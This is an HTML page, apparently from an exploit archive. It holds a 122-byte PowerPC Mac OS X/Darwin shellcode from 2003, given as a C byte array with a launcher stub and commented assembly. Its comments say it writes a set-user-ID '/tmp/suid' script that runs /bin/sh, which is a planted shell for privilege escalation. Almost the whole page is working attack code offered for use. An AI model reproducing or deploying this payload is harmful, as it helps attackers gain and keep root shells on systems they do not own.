<html><head><title>Osx/ppc - create /tmp/suid - 122 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
PPC OSX/Darwin Shellcode by B-r00t. 2003.
Does open(); write(); close(); exit();
See ASM below.
122 Bytes.
*/

char shellcode[] =
&quot;\x7c\xa5\x2a\x79\x40\x82\xff\xfd&quot;
&quot;\x7f\xe8\x02\xa6\x39\x1f\x01\x71&quot;
&quot;\x39\x08\xfe\xf4\x7c\xa8\x29\xae&quot;
&quot;\x38\x7f\x01\x68\x38\x63\xfe\xf4&quot;
&quot;\x38\x80\x02\x01\x38\xa0\xff\xff&quot;
&quot;\x39\x40\x01\x70\x38\x0a\xfe\x95&quot;
&quot;\x44\xff\xff\x02\x60\x60\x60\x60&quot;
&quot;\x38\x9f\x01\x72\x38\x84\xfe\xf4&quot;
&quot;\x38\xaa\xfe\x9c\x38\x0a\xfe\x94&quot;
&quot;\x44\xff\xff\x02\x60\x60\x60\x60&quot;
&quot;\x38\x0a\xfe\x96\x44\xff\xff\x02&quot;
&quot;\x60\x60\x60\x60\x38\x0a\xfe\x91&quot;
&quot;\x44\xff\xff\x02\x2f\x74\x6d\x70&quot;
&quot;\x2f\x73\x75\x69\x64\x58\x23\x21&quot;
&quot;\x2f\x62\x69\x6e\x2f\x73\x68\x0a&quot;
&quot;\x73\x68&quot;;

int main (void) 
{
        __asm__(&quot;b _shellcode&quot;);
}

/*
; PPC OS X / Darwin Shellcode by B-r00t. 
; open(); write(); close(); exit()
; Creates an SUID '/tmp/suid' to execute '/bin/sh'.
;
.globl _main
.text
_main:
        xor.    r5, r5, r5
        bnel    _main                    
        mflr    r31
        addi    r8, r31, 268+92+9
        addi    r8, r8, -268    
        stbx    r5, r8, r5
        addi    r3, r31, 268+92
        addi    r3, r3, -268
        li      r4, 513
        li      r5, -1  
        li      r10, 368
        addi    r0, r10, -363
        .long   0x44ffff02
        .long   0x60606060
        addi    r4, r31, 268+92+10
        addi    r4, r4, -268
        addi    r5, r10, -356
        addi    r0, r10, -364
        .long   0x44ffff02
        .long   0x60606060
        addi    r0, r10, -362
        .long   0x44ffff02      
        .long   0x60606060
        addi    r0, r10, -367
        .long   0x44ffff02
path:   .asciz  &quot;/tmp/suidX#!/bin/sh\nsh&quot;

*/



<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
